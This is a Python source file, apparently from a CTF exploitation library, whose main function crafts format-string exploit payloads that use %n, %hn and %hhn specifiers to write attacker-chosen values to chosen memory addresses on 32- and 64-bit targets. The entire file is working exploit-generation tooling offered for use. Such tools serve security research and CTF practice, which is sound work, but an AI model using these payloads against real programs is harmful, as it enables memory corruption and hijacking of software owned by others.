from ptrlib.util.encoding import *
from ptrlib.util.packing import *

def fsb_read(pos, reads, written=0, bits=32):
    # TODO
    return

def fsb(pos, writes, bs=1, written=0, bits=32):
    """Craft a Format String Exploit payload
    
    Args:
        pos (int)    : The position where your input appears on the stack
        writes (list): A disctionary which has the addresses as keys and the data as values
        bs (int)     : The bytes to write at once (must be 1, 2, 4)
        written (int): The byte length to be written before this payload

    Returns:
        bytes: crafted payload
    """
    assert bs == 1 or bs == 2 or bs == 4
    
    # set prefix
    if bs == 1:
        prefix = "hhn"
        len_data = 3
    elif bs == 2:
        prefix = "hn"
        len_data = 5
    else:
        prefix = "n"
        len_data = 10
        
    # craft payload
    payload = b''
    if bits == 32:
        # 32bit mode
        table = {}
        if bs == 1:
            for addr in writes:
                for i in range(4):
                    table[addr + i] = (writes[addr] >> (i * 8)) & 0xff
        elif bs == 2:
            for addr in writes:
                for i in range(2):
                    table[addr + i] = (writes[addr] >> (i * 16)) & 0xffff
            
        n = written + len(table) * 4
        i = 0
        
        for addr in table:
            payload += p32(addr)
            
        for addr in table:
            if bs == 1:
                l = ((table[addr] - n - 1) & 0xff) + 1
            elif bs == 2:
                l = ((table[addr] - n - 1) & 0xffff) + 1
            elif bs == 4:
                l = ((table[addr] - n - 1) & 0xffffffff) + 1
            payload += str2bytes("%{0}c%{1}${2}".format(
                l, pos + i, prefix
            ))
            n += l
            i += 1
            
    elif bits == 64:
        if len(writes) == 1:
            if bs == 1:
                if 0 <= list(writes.values())[0] <= 0xff:
                    table = list(writes.items())[0]
                else:
                    dump("fsb: Only values between 0 to 0xff can be writable in 64-bit mode", "warning")
                    dump("fsb: Split your payload if you can use several FSBs", "warning")
                    return None
            elif bs == 2:
                if 0 <= list(writes.values())[0] <= 0xffff:
                    table = list(writes.items())[0]
                else:
                    dump("fsb: Only values between 0 to 0xffff can be writable in 64-bit mode", "warning")
                    dump("fsb: Split your payload if you can use several FSBs", "warning")
                    return None
            elif bs == 4:
                if 0 <= list(writes.values())[0] <= 0xffffffff:
                    table = list(writes.items())[0]
                else:
                    dump("fsb: Only values between 0 to 0xffffffff can be writable in 64-bit mode", "warning")
                    dump("fsb: Split your payload if you can use several FSBs", "warning")
                    return None
        else:
            dump("fsb: Only one address can be writable in 64-bit mode", "warning")
            dump("fsb: Split your payload if you can use several FSBs", "warning")
            return None

        n = written
        paylen = written + 4 + len_data + len(prefix) + len(str(pos))
        if paylen % 8 != 0:
            paylen += 8 - (paylen % 8)
        pos += paylen // 8
        
        post_paylen = written + 4 + len_data + len(prefix) + len(str(pos))
        if post_paylen % 8 != 0:
            post_paylen += 8 - (post_paylen % 8)
        
        if post_paylen != paylen:
            paylen = post_paylen
            pos += 1
        
        if bs == 1:
            l = ((table[1] - n - 1) & 0xff) + 1
            payload = str2bytes("%{0:03}c%{1}${2}".format(
                l, pos, prefix
            ))
        elif bs == 2:
            l = ((table[1] - n - 1) & 0xffff) + 1
            payload = str2bytes("%{0:05}c%{1}${2}".format(
                l, pos, prefix
            ))
        elif bs == 4:
            l = ((table[1] - n - 1) & 0xffffffff) + 1
            payload = str2bytes("%{0:010}c%{1}${2}".format(
                l, pos, prefix
            ))
        payload += b'A' * (paylen - len(payload) - written)
        payload += p64(table[0]).rstrip(b'\x00')
        
    else:
        dump("fsb: Invalid bits specified", "warning")
        return None
    
    return payload
